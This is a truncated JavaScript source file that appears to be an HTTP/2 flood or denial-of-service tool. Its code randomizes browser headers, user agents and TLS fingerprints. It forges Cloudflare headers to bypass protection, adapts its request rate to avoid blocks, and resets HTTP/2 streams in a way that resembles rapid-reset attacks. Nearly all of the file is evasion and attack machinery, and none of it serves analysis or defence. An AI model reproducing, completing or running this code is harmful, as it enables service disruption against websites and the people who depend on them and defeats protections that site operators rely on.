const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
HPACK.prototype.setTableSize(4096);
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2');

// ========== ADVANCED HEADERS CONFIGURATION ==========
const advancedHeaders = {
    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    ],
    'accept-language': [
        'en-US,en;q=0.9,id;q=0.8',
        'en-US,en;q=0.8,id;q=0.7',
        'id-ID,id;q=0.9,en;q=0.8',
        'fr-FR,fr;q=0.9,en;q=0.8',
        'de-DE,de;q=0.9,en;q=0.8',
        'es-ES,es;q=0.9,en;q=0.8',
        'ja-JP,ja;q=0.9,en;q=0.8',
        'pt-BR,pt;q=0.9,en;q=0.8'
    ],
    'accept-encoding': [
        'gzip, deflate, br',
        'gzip, deflate',
        'br, gzip, deflate',
        'gzip, deflate, br, zstd',
        'identity',
        'gzip, deflate, br, sdch'
    ],
    'cache-control': [
        'max-age=0',
        'no-cache',
        'no-store',
        'private',
        'public, max-age=3600',
        'must-revalidate'
    ]
};

// ========== ENHANCED HEADER GENERATORS ==========
function getAdvancedHeader(type) {
    const headers = advancedHeaders[type];
    return headers ? headers[Math.floor(Math.random() * headers.length)] : '';
}

function generateInsaneSecCHUA() {
    const brandTemplates = [
        ['"Chromium"', '"Google Chrome"', '"Not;A=Brand"', '"Microsoft Edge"', '"Brave"'],
        ['"Google Chrome"', '"Chromium"', '"Not=A-Brand"', '"Yandex"', '"Opera"'],
        ['"Chrome"', '"Not?A\\x3DBrand"', '"Chromium"', '"Samsung Internet"', '"UCBrowser"'],
        ['"Firefox"', '"Mozilla"', '"Not-A.Brand"', '"LibreWolf"', '"Waterfox"'],
        ['"Safari"', '"AppleWebKit"', '"Not A#Brand"', '"Epic"', '"DuckDuckGo"'],
        ['"Microsoft Edge"', '"Chromium"', '"Not;A=Brand"', '"Bing"', '"LinkedIn"'],
        ['"Android WebView"', '"Chrome Mobile"', '"Not;A=Brand"', '"Mobile Safari"', '"Facebook"'],
        ['"Chromium"', '"Not_A_Brand"', '"Google"', '"Archive"', '"Tor"'],
        ['"Browser"', '"Web"', '"Net"', '"Surf"', '"Explore"']
    ];

    const versionSchemes = {
        chrome: () => 120 + Math.floor(Math.random() * 15),
        firefox: () => 115 + Math.floor(Math.random() * 20),
        safari: () => 15 + Math.floor(Math.random() * 10),
        edge: () => 120 + Math.floor(Math.random() * 12),
        mobile: () => 100 + Math.floor(Math.random() * 30),
        random: () => Math.floor(Math.random() * 200)
    };

    const selectedTemplate = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];
    const brandCount = 2 + Math.floor(Math.random() * 4);
    const shuffledBrands = [...selectedTemplate].sort(() => Math.random() - 0.5).slice(0, brandCount);
    
    return shuffledBrands.map(brand => {
        let version;
        
        if (brand.includes('Chromium') || brand.includes('Chrome') || brand.includes('Edge')) {
            version = versionSchemes.chrome();
        } else if (brand.includes('Firefox') || brand.includes('Mozilla')) {
            version = versionSchemes.firefox();
        } else if (brand.includes('Safari') || brand.includes('Apple')) {
            version = versionSchemes.safari();
        } else if (brand.includes('Android') || brand.includes('Mobile')) {
            version = versionSchemes.mobile();
        } else if (brand.includes('Not')) {
            const schemes = [() => Math.floor(Math.random() * 100), () => Math.floor(Math.random() * 25), () => Math.floor(Math.random() * 10)];
            version = schemes[Math.floor(Math.random() * schemes.length)]();
        } else {
            version = versionSchemes.random();
        }
        
        if (Math.random() < 0.2) {
            version += `.${Math.floor(Math.random() * 9999)}`;
        }
        
        if (Math.random() < 0.1) {
            version += `.${Math.floor(Math.random() * 999)}`;
        }
        
        return `${brand};v="${version}"`;
    }).join(', ');
}

function generateModernSecCHUA() {
    const modernTemplates = [
        {
            brands: ['"Chromium"', '"Google Chrome"', '"Not_A Brand"'],
            versions: ['142', '142', '99'],
            format: `{b1};v="{v1}", {b2};v="{v2}", {b3};v="{v3}"`
        },
        {
            brands: ['"Google Chrome"', '"Chromium"', '"Not;A=Brand"'],
            versions: ['142', '142', '99'],
            format: `{b1};v="{v1}", {b2};v="{v2}", {b3};v="{v3}"`
        },
        {
            brands: ['"Chrome"', '"Not_A Brand"', '"Chromium"'],
            versions: ['142', '99', '142'],
            format: `{b1};v="{v1}", {b2};v="{v2}", {b3};v="{v3}"`
        }
    ];

    const template = modernTemplates[Math.floor(Math.random() * modernTemplates.length)];
    const versionVariation = Math.floor(Math.random() * 3);
    const mainVersion = `14${2 + versionVariation}`;
    
    return template.format
        .replace('{b1}', template.brands[0])
        .replace('{v1}', template.versions[0] === '142' ? mainVersion : template.versions[0])
        .replace('{b2}', template.brands[1])
        .replace('{v2}', template.versions[1] === '142' ? mainVersion : template.versions[1])
        .replace('{b3}', template.brands[2])
        .replace('{v3}', template.versions[2]);
}

// ========== INSANE TLS PROFILES ==========
const insaneTLSProfiles = [
    {
        name: "Chrome_Quantum",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_pss_sha256:rsa_pss_pss_sha384:ed25519:ed448",
        curves: "X25519:P-256:P-384:P-521:X448:ffdhe2048:ffdhe3072",
        alpn: ["h2", "http/1.1"]
    },
    {
        name: "Firefox_Quantum", 
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pkcs1_sha1:ecdsa_sha1",
        curves: "X25519:P-256:P-384:P-521:ffdhe2048:ffdhe3072",
        alpn: ["h2", "http/1.1"]
    },
    {
        name: "Safari_Blizzard",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ed25519",
        curves: "X25519:P-256:P-384:P-521",
        alpn: ["h2", "http/1.1"]
    },
    {
        name: "Edge_Chaos",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_pss_sha256",
        curves: "X25519:P-256:P-384:P-521:ffdhe2048",
        alpn: ["h2", "http/1.1"]
    },
    {
        name: "Android_Tsunami",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384",
        curves: "X25519:P-256:P-384:P-521",
        alpn: ["h2", "http/1.1"]
    },
    {
        name: "Experimental_Nuke",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384",
        curves: "X25519:P-256:P-384:P-521:X448:ffdhe2048:ffdhe3072:ffdhe4096",
        alpn: ["h2", "http/1.1"]
    }
];

function getInsaneTLSProfile() {
    const profile = insaneTLSProfiles[Math.floor(Math.random() * insaneTLSProfiles.length)];
    
    if (Math.random() < 0.3) {
        const ciphers = profile.ciphers.split(':');
        for (let i = ciphers.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [ciphers[i], ciphers[j]] = [ciphers[j], ciphers[i]];
        }
        profile.ciphers = ciphers.join(':');
    }
    
    if (Math.random() < 0.2) {
        const extraCiphers = [
            "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", 
            "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384",
            "AES128-GCM-SHA256", "AES256-GCM-SHA384", "AES128-SHA256", "AES256-SHA256"
        ];
        profile.ciphers += ':' + extraCiphers[Math.floor(Math.random() * extraCiphers.length)];
    }
    
    return profile;
}

// ========== CLOUDFLARE BYPASS HEADERS ==========
function generateCFBypassHeaders() {
    const cfHeaders = {
        'cf-ipcountry': ['US', 'GB', 'DE', 'FR', 'JP', 'SG', 'ID', 'BR', 'CA', 'AU'],
        'cf-ray': () => `${generateRandomString(8, 8)}-${generateRandomString(3, 3)}`,
        'cf-visitor': `{"scheme":"https"}`,
        'cf-connecting-ip': `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
        'cdn-loop': 'cloudflare',
        'cf-worker': Math.random() > 0.8 ? 'production' : undefined
    };
    
    const headers = {};
    
    if (Math.random() > 0.3) {
        headers['cf-ipcountry'] = cfHeaders['cf-ipcountry'][Math.floor(Math.random() * cfHeaders['cf-ipcountry'].length)];
    }
    
    if (Math.random() > 0.5) {
        headers['cf-ray'] = cfHeaders['cf-ray']();
    }
    
    if (Math.random() > 0.7) {
        headers['cf-visitor'] = cfHeaders['cf-visitor'];
    }
    
    return headers;
}

// ========== CHAOTIC HEADERS GENERATOR ==========
function generateChaoticHeaders() {
    const headerTemplates = {
        accept: [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        ],
        'accept-language': [
            'en-US,en;q=0.9,id;q=0.8',
            'en-US,en;q=0.8,id;q=0.7',
            'id-ID,id;q=0.9,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'es-ES,es;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8',
            'pt-BR,pt;q=0.9,en;q=0.8',
            'ru-RU,ru;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8'
        ],
        'accept-encoding': [
            'gzip, deflate, br',
            'gzip, deflate',
            'br, gzip, deflate',
            'gzip, deflate, br, zstd',
            'identity',
            'gzip, deflate, br, sdch',
            'gzip, deflate, br, zstd, sdch'
        ],
        'cache-control': [
            'max-age=0',
            'no-cache',
            'no-store',
            'private',
            'public, max-age=3600',
            'must-revalidate',
            'no-transform',
            'only-if-cached'
        ]
    };

    const headers = {};
    
    for (const [key, values] of Object.entries(headerTemplates)) {
        if (Math.random() > 0.1) {
            headers[key] = values[Math.floor(Math.random() * values.length)];
            
            if (Math.random() < 0.15) {
                const parts = headers[key].split(',');
                if (parts.length > 1) {
                    for (let i = parts.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [parts[i], parts[j]] = [parts[j], parts[i]];
                    }
                    headers[key] = parts.join(',');
                }
            }
        }
    }

    const extraHeaders = {
        'dnt': ['1', '0'],
        'upgrade-insecure-requests': ['1'],
        'sec-gpc': ['1'],
        'priority': ['u=1, i'],
        'viewport-width': ['1920', '1366', '1536', '1440', '1280'],
        'rtt': ['50', '100', '150', '200'],
        'downlink': ['10', '5', '2.5', '1'],
        'ect': ['4g', '3g', '2g']
    };

    for (const [header, values] of Object.entries(extraHeaders)) {
        if (Math.random() < 0.3) {
            headers[header] = values[Math.floor(Math.random() * values.length)];
        }
    }

    return headers;
}

function generateModernHeaders() {
    const modernHeaderTemplates = {
        accept: [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        ],
        'accept-encoding': [
            'gzip, deflate, br',
            'gzip, deflate, br, zstd',
            'gzip, deflate',
            'br, gzip, deflate'
        ],
        'accept-language': [
            'id,en-US;q=0.9,en;q=0.8,ru;q=0.7',
            'en-US,en;q=0.9,id;q=0.8',
            'id-ID,id;q=0.9,en;q=0.8',
            'en-US,en;q=0.8,id;q=0.7,ru;q=0.6',
            'id,en;q=0.9,en-US;q=0.8'
        ],
        'cache-control': [
            'max-age=0',
            'no-cache',
            'no-store',
            'private'
        ]
    };

    const headers = {};
    
    for (const [key, values] of Object.entries(modernHeaderTemplates)) {
        if (Math.random() > 0.1) {
            headers[key] = values[Math.floor(Math.random() * values.length)];
        }
    }

    const modernExtraHeaders = {
        'priority': ['u=4, i', 'u=1, i', 'u=2, i', 'u=0, i'],
        'sec-purpose': ['prefetch;anonymous-client-ip', 'prefetch', 'anonymous-client-ip'],
        'sec-fetch-dest': ['document', 'empty', 'script', 'style'],
        'sec-fetch-mode': ['navigate', 'cors', 'no-cors'],
        'sec-fetch-site': ['none', 'same-origin', 'cross-site', 'same-site'],
        'upgrade-insecure-requests': ['1'],
        'dnt': ['1', '0'],
        'sec-gpc': ['1']
    };

    for (const [header, values] of Object.entries(modernExtraHeaders)) {
        if (Math.random() < 0.7) {
            headers[header] = values[Math.floor(Math.random() * values.length)];
        }
    }

    const isMobile = Math.random() > 0.5;
    if (isMobile) {
        headers['sec-ch-ua-mobile'] = '?1';
        headers['sec-ch-ua-platform'] = '"Android"';
    } else {
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = '"Windows"';
    }

    return headers;
}

// ========== ENHANCED USER-AGENT GENERATORS ==========
function generateRealisticUserAgent() {
    const platforms = [
        {
            name: 'Windows',
            versions: ['10.0', '11.0'],
            architectures: ['Win64; x64', 'WOW64', 'Win64; x64; rv'],
            templates: [
                'Mozilla/5.0 (Windows NT {version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
                'Mozilla/5.0 (Windows NT {version}; {arch}; rv:{firefoxVersion}) Gecko/20100101 Firefox/{firefoxVersion}',
                'Mozilla/5.0 (Windows NT {version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36 Edg/{edgeVersion}'
            ]
        },
        {
            name: 'Mac',
            versions: ['10_15_7', '11_6_1', '12_0', '13_0', '14_0'],
            architectures: ['Intel Mac OS X', 'Apple Silicon'],
            templates: [
                'Mozilla/5.0 (Macintosh; {arch} {version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
                'Mozilla/5.0 (Macintosh; {arch} {version}; rv:{firefoxVersion}) Gecko/20100101 Firefox/{firefoxVersion}',
                'Mozilla/5.0 (Macintosh; {arch} {version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safariVersion} Safari/605.1.15'
            ]
        }
    ];

    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const version = platform.versions[Math.floor(Math.random() * platform.versions.length)];
    const arch = platform.architectures[Math.floor(Math.random() * platform.architectures.length)];
    const template = platform.templates[Math.floor(Math.random() * platform.templates.length)];
    
    const chromeVersion = `${120 + Math.floor(Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;
    const firefoxVersion = `${110 + Math.floor(Math.random() * 20)}.0`;
    const edgeVersion = `${120 + Math.floor(Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;
    const safariVersion = `${15 + Math.floor(Math.random() * 5)}.${Math.floor(Math.random() * 5)}`;

    return template
        .replace('{version}', version)
        .replace('{arch}', arch)
        .replace('{chromeVersion}', chromeVersion)
        .replace('{firefoxVersion}', firefoxVersion)
        .replace('{edgeVersion}', edgeVersion)
        .replace('{safariVersion}', safariVersion);
}

function generateModernUserAgent() {
    const platforms = [
        {
            name: 'Android',
            versions: ['10', '11', '12', '13', '14'],
            architectures: ['K', 'LMY47X', 'NMF26F', 'OPM1.171019.026'],
            templates: [
                'Mozilla/5.0 (Linux; Android {version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android {version}; {arch}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chromeVersion} Mobile Safari/537.36'
            ]
        },
        {
            name: 'Windows',
            versions: ['10.0', '11.0'],
            architectures: ['Win64; x64', 'WOW64'],
            templates: [
                'Mozilla/5.0 (Windows NT {version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
                'Mozilla/5.0 (Windows NT {version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36 Edg/{edgeVersion}'
            ]
        },
        {
            name: 'iPhone',
            versions: ['15_0', '16_0', '16_6', '17_0'],
            architectures: ['iPhone'],
            templates: [
                'Mozilla/5.0 ({arch}; CPU {arch} OS {version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safariVersion} Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 ({arch}; CPU {arch} OS {version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{chromeVersion} Mobile/15E148 Safari/604.1'
            ]
        }
    ];

    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const version = platform.versions[Math.floor(Math.random() * platform.versions.length)];
    const arch = platform.architectures[Math.floor(Math.random() * platform.architectures.length)];
    const template = platform.templates[Math.floor(Math.random() * platform.templates.length)];
    
    const chromeVersion = `14${2 + Math.floor(Math.random() * 5)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;
    const edgeVersion = `12${Math.floor(Math.random() * 5)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;
    const safariVersion = `${17 + Math.floor(Math.random() * 3)}.${Math.floor(Math.random() * 5)}`;

    return template
        .replace('{version}', version)
        .replace('{arch}', arch)
        .replace('{chromeVersion}', chromeVersion)
        .replace('{edgeVersion}', edgeVersion)
        .replace('{safariVersion}', safariVersion);
}

// ========== ENHANCED TLS OPTIONS ==========
function createChaoticTLSOptions() {
    const profile = getInsaneTLSProfile();
    
    const alpnOptions = [
        ['h2', 'http/1.1'],
        ['http/1.1', 'h2'],
        ['h2'],
        ['http/1.1'],
        ['h2', 'http/1.1'],
        ['http/1.1', 'h2']
    ];
    
    const secureOptions = [
        crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET,
        crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION,
        crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
        crypto.constants.SSL_OP_ALL
    ];
    
    const versions = [
        ['TLSv1.2', 'TLSv1.3'],
        ['TLSv1.3'],
        ['TLSv1.2'],
        ['TLSv1.2', 'TLSv1.3', 'TLSv1.1']
    ];
    
    return {
        ALPNProtocols: alpnOptions[Math.floor(Math.random() * alpnOptions.length)],
        servername: url.host,
        ciphers: profile.ciphers,
        sigalgs: profile.sigalgs,
        curves: profile.curves,
        secureOptions: secureOptions[Math.floor(Math.random() * secureOptions.length)],
        secure: true,
        minVersion: versions[Math.floor(Math.random() * versions.length)][0],
        maxVersion: versions[Math.floor(Math.random() * versions.length)][versions[Math.floor(Math.random() * versions.length)].length - 1],
        rejectUnauthorized: false,
        honorCipherOrder: Math.random() > 0.5,
        sessionTimeout: Math.floor(Math.random() * 300),
        ticketSize: Math.floor(Math.random() * 10000)
    };
}

// ========== NUCLEAR HEADERS GENERATORS ==========
function generateNuclearHeaders() {
    const secCHUA = generateInsaneSecCHUA();
    const chaoticHeaders = generateChaoticHeaders();
    const cfBypass = generateCFBypassHeaders();
    
    return {
        ...chaoticHeaders,
        ...cfBypass,
        'sec-ch-ua': secCHUA,
        'sec-ch-ua-mobile': Math.random() > 0.3 ? '?0' : '?1',
        'sec-ch-ua-platform': `"${['Windows', 'macOS', 'Linux', 'Android', 'iOS', 'Chrome OS'][Math.floor(Math.random() * 6)]}"`,
        'user-agent': generateRealisticUserAgent(),
        
        ...(Math.random() > 0.5 && { 'save-data': 'on' }),
        ...(Math.random() > 0.7 && { 'device-memory': `${Math.floor(Math.random() * 8) + 1}` }),
        ...(Math.random() > 0.6 && { 'rtt': `${Math.floor(Math.random() * 200) + 50}` }),
        ...(Math.random() > 0.8 && { 'downlink': `${(Math.random() * 10 + 0.1).toFixed(1)}` })
    };
}

function generateModernNuclearHeaders() {
    const secCHUA = generateModernSecCHUA();
    const modernHeaders = generateModernHeaders();
    const cfBypass = generateCFBypassHeaders();
    
    return {
        ...modernHeaders,
        ...cfBypass,
        'sec-ch-ua': secCHUA,
        'user-agent': generateModernUserAgent(),
        
        ...(Math.random() > 0.5 && { 'sec-ch-ua-full-version-list': secCHUA }),
        ...(Math.random() > 0.6 && { 'sec-ch-ua-arch': '"x86"' }),
        ...(Math.random() > 0.6 && { 'sec-ch-ua-bitness': '"64"' }),
        ...(Math.random() > 0.7 && { 'sec-ch-ua-model': '""' }),
        ...(Math.random() > 0.5 && { 'device-memory': `${Math.floor(Math.random() * 8) + 1}` }),
        ...(Math.random() > 0.6 && { 'rtt': `${Math.floor(Math.random() * 200) + 50}` }),
        ...(Math.random() > 0.7 && { 'downlink': `${(Math.random() * 10 + 0.1).toFixed(1)}` }),
        ...(Math.random() > 0.8 && { 'ect': ['4g', '3g', '2g'][Math.floor(Math.random() * 3)] })
    };
}

// ========== REQUEST PATTERN SIMULATOR ==========
class RequestPatternSimulator {
    constructor() {
        this.patterns = [
            'immediate',
            'gradual', 
            'burst',
            'random'
        ];
        this.currentPattern = 'random';
    }

    getDelay(pattern) {
        switch(pattern) {
            case 'immediate':
                return Math.random() * 50 + 10;
            case 'gradual':
                return Math.random() * 200 + 50;
            case 'burst':
                return Math.random() < 0.8 ? Math.random() * 50 : Math.random() * 1000;
            case 'random':
            default:
                return Math.random() * 300 + 20;
        }
    }

    getNextPattern() {
        this.currentPattern = this.patterns[Math.floor(Math.random() * this.patterns.length)];
        return this.currentPattern;
    }
}

const patternSimulator = new RequestPatternSimulator();

// ========== ADAPTIVE RATE LIMITER ==========
class AdaptiveRateLimiter {
    constructor(baseRate) {
        this.baseRate = baseRate;
        this.currentRate = baseRate;
        this.lastAdjustment = Date.now();
        this.successCount = 0;
        this.errorCount = 0;
        this.blockedCount = 0;
    }

    getDelay() {
        const now = Date.now();
        if (now - this.lastAdjustment > 5000) {
            this.adjustRate();
            this.lastAdjustment = now;
        }

        const pattern = patternSimulator.getNextPattern();
        const patternDelay = patternSimulator.getDelay(pattern);
        const jitter = 1 + (Math.random() * 0.5 - 0.25);
        const delay = (1000 / this.currentRate) * jitter + patternDelay;
        
        return Math.max(10, Math.min(delay, 1000));
    }

    adjustRate() {
        const total = this.successCount + this.errorCount + this.blockedCount;
        if (total === 0) return;

        const successRatio = this.successCount / total;
        const blockedRatio = this.blockedCount / total;
        
        if (successRatio > 0.95 && blockedRatio < 0.05) {
            this.currentRate = Math.min(this.baseRate * 2, this.currentRate * 1.2);
        } else if (successRatio < 0.8 || blockedRatio > 0.1) {
            this.currentRate = Math.max(this.baseRate * 0.5, this.currentRate * 0.8);
        }

        this.successCount = 0;
        this.errorCount = 0;
        this.blockedCount = 0;
    }

    recordSuccess() { this.successCount++; }
    recordError() { this.errorCount++; }
    recordBlocked() { this.blockedCount++; }
}

// ========== COMMON RESOURCES ==========
const commonResources = [
    '/css/style.css', '/js/app.js', '/images/logo.png', '/favicon.ico',
    '/static/main.js', '/assets/style.css', '/img/header.jpg', '/robots.txt',
    '/sitemap.xml', '/api/health', '/api/status', '/manifest.json',
    '/font/webfont.woff2', '/video/preview.mp4', '/audio/notification.mp3',
    '/css/bootstrap.min.css', '/js/jquery.min.js', '/images/banner.jpg'
];

function getRandomResource() {
    return commonResources[Math.floor(Math.random() * commonResources.length)];
}

function shuffleHeaders(headers) {
    const headerEntries = Object.entries(headers);
    for (let i = headerEntries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [headerEntries[i], headerEntries[j]] = [headerEntries[j], headerEntries[i]];
    }
    return Object.fromEntries(headerEntries);
}

// ========== SMART RST CONTROLLER ==========
class SmartRSTController {
    constructor() {
        this.streamStates = new Map();
        this.errorPatterns = new Set(['429', '403', '503', '500']);
        this.blockedCount = 0;
    }

    shouldReset(streamId, headers) {
        const status = headers.find(h => h[0] === ':status');
        if (status && this.errorPatterns.has(status[1])) {
            if (status[1] === '403') {
                this.blockedCount++;
            }
            return true;
        }

        if (Math.random() < 0.05) {
            return true;
        }

        const state = this.streamStates.get(streamId);
        if (state && Date.now() - state.startTime > 3000) {
            return true;
        }

        return false;
    }

    getResetCode() {
        const codes = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xA, 0xB, 0xC, 0xD];
        return codes[Math.floor(Math.random() * codes.length)];
    }

    trackStream(streamId) {
        this.streamStates.set(streamId, { startTime: Date.now() });
    }

    untrackStream(streamId) {
        this.streamStates.delete(streamId);
    }

    getBlockedCount() {
        return this.blockedCount;
    }
}

// ========== SMART RETRY MECHANISM ==========
class SmartRetryMechanism {
    constructor(maxRetries = 3) {
        this.maxRetries = maxRetries;
        this.retryDelays = [100, 500, 1000];
    }

    async executeWithRetry(operation, context = {}) {
        for (let attempt = 0; attempt < this.maxRetries; attempt++) {
            try {
                const result = await operation();
                if (result && !result.blocked) {
                    return result;
                }
                
                if (attempt < this.maxRetries - 1) {
                    await this.delay(attempt);
                    context.protocol = getOptimalProtocol();
                }
            } catch (error) {
                if (attempt === this.maxRetries - 1) throw error;
